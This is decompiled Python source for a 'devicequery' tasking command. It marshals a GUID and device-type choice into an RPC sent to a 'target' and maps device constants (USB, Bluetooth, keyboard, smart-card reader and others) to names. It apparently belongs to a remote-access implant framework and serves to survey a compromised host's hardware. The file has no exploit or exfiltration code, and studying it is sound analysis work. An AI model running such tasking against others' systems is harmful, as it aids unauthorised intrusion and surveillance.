# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_DeviceQuery_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.devicequery', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.devicequery.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.status.cmd.devicequery.Params()
    tgtParams.choice = lpParams['choice']
    tgtParams.guid[0] = lpParams['guid1'] >> 24 & 255
    tgtParams.guid[1] = lpParams['guid1'] >> 16 & 255
    tgtParams.guid[2] = lpParams['guid1'] >> 8 & 255
    tgtParams.guid[3] = lpParams['guid1'] & 255
    tgtParams.guid[4] = lpParams['guid2'] >> 24 & 255
    tgtParams.guid[5] = lpParams['guid2'] >> 16 & 255
    tgtParams.guid[6] = lpParams['guid2'] >> 8 & 255
    tgtParams.guid[7] = lpParams['guid2'] & 255
    tgtParams.guid[8] = lpParams['guid3'] >> 24 & 255
    tgtParams.guid[9] = lpParams['guid3'] >> 16 & 255
    tgtParams.guid[10] = lpParams['guid3'] >> 8 & 255
    tgtParams.guid[11] = lpParams['guid3'] & 255
    tgtParams.guid[12] = lpParams['guid4'] >> 24 & 255
    tgtParams.guid[13] = lpParams['guid4'] >> 16 & 255
    tgtParams.guid[14] = lpParams['guid4'] >> 8 & 255
    tgtParams.guid[15] = lpParams['guid4'] & 255
    rpc = mca.status.cmd.devicequery.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    taskXml = mcl.tasking.Tasking()
    if tgtParams.choice == mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_USER_SPECIFIC:
        taskXml.SetType('USER_SPECIFIC')
        taskXml.AddSearchMask('%02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x' % (
         tgtParams.guid[0], tgtParams.guid[1], tgtParams.guid[2], tgtParams.guid[3],
         tgtParams.guid[4], tgtParams.guid[5], tgtParams.guid[6], tgtParams.guid[7],
         tgtParams.guid[8], tgtParams.guid[9], tgtParams.guid[10], tgtParams.guid[11],
         tgtParams.guid[12], tgtParams.guid[13], tgtParams.guid[14], tgtParams.guid[15]))
    else:
        taskXml.SetType('WELL_KNOWN')
    taskXml.AddSearchMask(_getDeviceName(mca, tgtParams.choice))
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.status.cmd.devicequery.errorStrings)
        return False
    return True


def _getDeviceName(mca, choice):
    DEVICE_NAMES = {mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_USER_SPECIFIC: 'UserSpecific',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_U1394: 'U1394',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_U1394DEBUG: 'U1394Debug',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_U61883: 'U61883',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_ADAPTER: 'Adapter',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_ALL: 'All',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_APM_SUPPORT: 'ApmSupport',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_AVC: 'Avc',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_BATTERY: 'Battery',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_BIOMETRIC: 'Biometric',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_BLUETOOTH: 'Bluetooth',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_CDROM: 'Cdrom',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_COMPUTER: 'Computer',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_DECODER: 'Decoder',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_DISK_DRIVE: 'DiskDrive',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_DISPLAY: 'Display',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_DOT4: 'Dot4',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_DOT4PRINT: 'Dot4Printer',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_ENUM1394: 'Enum1394',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_FDC: 'Fdc',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_FLOPPY: 'FloppyDisk',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_GPS: 'Gps',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_HDC: 'Hdc',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_HID_CLASS: 'Hidclass',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_IMAGE: 'Image',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_INFINIBAND: 'Infiniband',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_INFRARED: 'Infrared',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_KEYBOARD: 'Keyboard',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_LEGACY_DRIVER: 'LegacyDriver',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_MEDIA: 'Media',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_MEDIUM_CHANGER: 'MediumChanger',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_MODEM: 'Modem',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_MONITOR: 'Monitor',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_MOUSE: 'Mouse',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_MTD: 'Mtd',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_MULTIFUNCTION: 'Multifunction',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_MULTIPORT_SERIAL: 'MultiportSerial',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_NET: 'Net',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_NET_CLIENT: 'NetClient',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_NET_SERVICE: 'NetService',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_NET_TRANS: 'NetTrans',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_NO_DRIVER: 'NoDriver',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_PARALLEL: 'Parallel',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_PCMCIA: 'Pcmcia',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_PNPPRINTERS: 'PnPPrinters',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_PORTS: 'Ports',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_PRINTER: 'Printer',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_PRINTER_UPGRADE: 'PrinterUpgrade',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_PROCESSOR: 'Processor',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_SBP2: 'Sbp2',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_SCSI_ADAPTER: 'ScsiAdapter',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_SECURITYACCELERATOR: 'SecurityAccelerator',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_SMART_CARD_READER: 'SmartCardReader',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_SOUND: 'Sound',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_STILL_IMAGE: 'StillImage',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_SYSTEM: 'System',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_TAPE_DRIVE: 'TapeDrive',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_UNKNOWN: 'Unknown',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_USB: 'Usb',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_VOLUME: 'Volume',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_VOLUMESNAPSHOT: 'VolumeSnapshot',
       mca.status.cmd.devicequery.PARAMS_DEVICE_TYPE_WCEUSBS: 'Wceusbs'
       }
    if DEVICE_NAMES.has_key(choice):
        return DEVICE_NAMES[choice]
    else:
        return 'UNHANDLED_TYPE(%u)' % choice


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)